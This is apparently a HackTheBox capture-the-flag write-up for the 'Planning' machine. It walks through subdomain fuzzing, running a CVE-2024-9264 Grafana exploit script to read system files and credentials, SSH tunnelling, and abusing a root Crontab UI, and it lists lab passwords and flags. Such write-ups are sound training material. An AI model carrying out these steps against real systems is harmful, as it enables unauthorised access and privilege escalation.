---
title: "Planning @ HTB"
date: 2025-08-03
categories: [HackTheBox, Medium]
tags: [grafana, cve-2024-9264, vhost, ssh-tunneling, crontab]
image:
  path: /assets/head.webp
---

## Introduction

Planning is a Medium difficulty Linux machine on HackTheBox. The attack path involves discovering a Grafana subdomain, exploiting a known vulnerability to extract credentials from environment variables, SSH-ing in as a low-privilege user, then using SSH tunneling to access an internal Crontab dashboard to escalate to root.

---

### Enumeration:~#

We start with an Nmap scan to see what services are running on the target:

```bash
~> nmap -sVC 10.10.11.68

22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


We have SSH on port 22 and a web server on port 80. 
After we try to access the web server, we are immediately redirected to `http://planning.htb/` so we add that to our `/etc/hosts` file:


![image description](/assets/image%20(11).png)

```bash
echo "10.10.11.68 planning.htb" | sudo tee -a /etc/hosts
```

We run dirsearch to find hidden directories on the web server:
```bash
dirsearch -u http://planning.htb
```

Nothing particularly interesting comes back

### Vhost Scanning:~#
Since the site redirects to a hostname, there might be other virtual hosts (subdomains) running on the same server. We use ffuf to fuzz for them:

```bash
~> ffuf -u http://10.10.11.68 -H "Host: FUZZ.planning.htb" -w ~/subs -fw 6

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.68
 :: Wordlist         : FUZZ: /home/exploit/subs
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 956ms]
```

We get a hit. We can add it to our /etc/hosts file.

### Web_Exploitation:~#

Browsing to `http://grafana.planning.htb` brings up a **Grafana** login page.

![image description](/assets/image%20(12).png)

Looking at the bottom of the page we can see it is running **Grafana v11.0.0**.

A quick search shows this version is vulnerable to **CVE-2024-9264** — an SQL injection vulnerability that allows authenticated remote code execution via DuckDB.

We download the exploit script and first read `/etc/passwd` to confirm code execution works:

```bash
python3 CVE-2024-9264.py http://grafana.planning.htb -u admin -p 0D5oT70Fq13EvB5r -f /etc/passwd
```

![image description](/assets/image%20(13).png)

It works, we can read system files. Now let's dump the environment variables to see if anything sensitive is stored there:

![image description](/assets/image%20(14).png)

In the output we spot these two interesting lines:

**GF_SECURITY_ADMIN_USER=enzo**
**GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!**

Grafana was storing user credentials as environment variables. We now have valid system credentials: `enzo:RioTecRANDEntANT!`

We try the credentials over SSH and we are able to successfully login

![image description](/assets/image%20(15).png)

We can get the user flag
```bash
cat user.txt
1cdf36fece3b5b887e129de5ccbd29dd
```

### Privilege_Escalation:~#
Now that we're on the machine, we can do some manual enumeration.
In the `/opt/crontab` directory, there is a `crontab.db` file which contains a password.

![image description](/assets/image%20(17).png)

Let's note that down.
```
P4ssw0rdS0pRi0T3c
```

Now, let's do some more enumeration and look for any internally running services that aren't exposed to the outside:

```bash
ss -tuln
```

We notice port **8000** is listening only on localhost (`127.0.0.1:8000`). This means there's a service running internally that we can't access directly from our machine.
![image description](/assets/image%20(16).png)

#### SSH Tunneling
We use SSH tunneling to forward that internal port to our local machine:

```bash
ssh -L 8080:localhost:8000 enzo@planning.htb
```

Now browsing to `http://localhost:8080` on our machine shows us an internal **Crontab UI** dashboard, a web interface for managing cronjobs.

We login to the dashboard as the `root` user with the password we found earlier

```
root : P4ssw0rdS0pRi0T3c
```

![image description](/assets/image%20(19).png)

We can see two existing cronjobs. Since we can create and run cronjobs as root through this dashboard, we can abuse it to do anything we want. Let's create a cron job to copy the root flag to our home directory and change the permissions so we can read it.

```bash
/usr/bin/cp /root/root.txt /home/enzo/root.txt
/usr/bin/chmod a+r /home/enzo/root.txt
```

After running it, we go back to our SSH session and read the root flag:

```bash
cat root.txt

fcb01403d438053f83e6371dee2acd3f
```

Rooted! Happy hacking!!!
